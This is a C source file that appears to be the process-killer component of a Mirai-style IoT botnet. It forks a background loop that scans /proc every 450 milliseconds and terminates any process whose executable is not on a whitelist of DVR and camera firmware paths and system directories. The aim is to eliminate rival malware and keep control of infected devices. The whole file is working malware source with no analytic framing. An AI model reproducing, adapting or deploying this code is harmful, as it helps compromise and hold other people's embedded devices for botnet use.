#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <linux/limits.h>
#include <sys/types.h>
#include <dirent.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>
#include "includes.h"
#include "util.h"


int killer_pid = 0;

void killer_kill(void) {
    if (killer_pid != 0)
        kill(killer_pid, 9);
}

static int killer_getpid(void)
{
    return killer_pid;
}

char *whitlistpaths[] = {
    "var/Challenge",
    "app/hi3511",
    "gmDVR",
    "ibox",
    "usr/dvr_main _8182T_1108",
    "mnt/mtd/app/gui",
    "var/Kylin",
    "l0 c/udevd",
    "anko-app/ankosample _8182T_1104",
    "var/tmp/sonia",
    "hicore",
    "stm_hi3511_dvr",
    "/bin/busybox",
    "/usr/lib/systemd/systemd",
    "/usr/libexec/openssh/sftp-server",
    "usr/",
    "shell",
    "mnt/",
    "sys/",
    "bin/",
    "boot/",
    "run/",
    "media/",
    "srv/",
    "var/run/",
    "sbin/",
    "lib/",
    "etc/",
    "dev/",
    "home/Davinci",
    "telnet",
    "ssh",
    "watchdog",
    "/var/spool",
    "/var/Sofia",
    "sshd",
    "/usr/compress/bin/",
    "/compress/bin",
    "/compress/usr/",
    "bash",
    "httpd",
    "telnetd",
    "dropbear",
    "ropbear",
    "encoder",
    "system",
    "/root/dvr_gui/",
    "/root/dvr_app/",
    "/anko-app/",
    "/opt/"};

char check_self_path(char *real_path)
{
    int len;
    char self_path[64];

    if ((len = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1)) == -1)
        return 1;

    self_path[len] = 0;

    if (!strcmp(real_path, self_path))
        return 0;

    return 1;
}

char check_safe_path(char *real_path)
{
    if (!check_self_path(real_path))
        return 1;
    for (unsigned int i = 0; i < sizeof(whitlistpaths) / sizeof(whitlistpaths[0]); i++)
        if (strstr(real_path, whitlistpaths[i]))
            return 1;
    return 0;
}
char check_real_path(char *pid)
{
    int len;
    char exe_path[20], real_path[64];

    strcpy(exe_path, "/proc/");
    strcat(exe_path, pid);
    strcat(exe_path, "/exe");

    if ((len = readlink(exe_path, real_path, sizeof(real_path) - 1)) == -1)
        return 1;
    real_path[len] = 0;
    if (!check_safe_path(real_path))
        return 0;
    return 1;
}



char duck_killer(void)
{
    DIR *dir;
    if ((dir = opendir("/proc/")) == NULL)
        return 0;
    struct dirent *file;

    while ((file = readdir(dir)))
    {
        if (*(file->d_name) < '0' || *(file->d_name) > '9')
            continue;
        if (!check_real_path(file->d_name))
        {
            kill(atoi(file->d_name), SIGTERM);
            printf("[killer]: killed pid:%s\n", file->d_name);
        }
    }
    closedir(dir);
    return 1;
}
void killer_init(void)
{ 
    
    if (!fork())
    {
        while (1)
        {
            if (!duck_killer())
                break;
            usleep(450000);
        }
    }
}
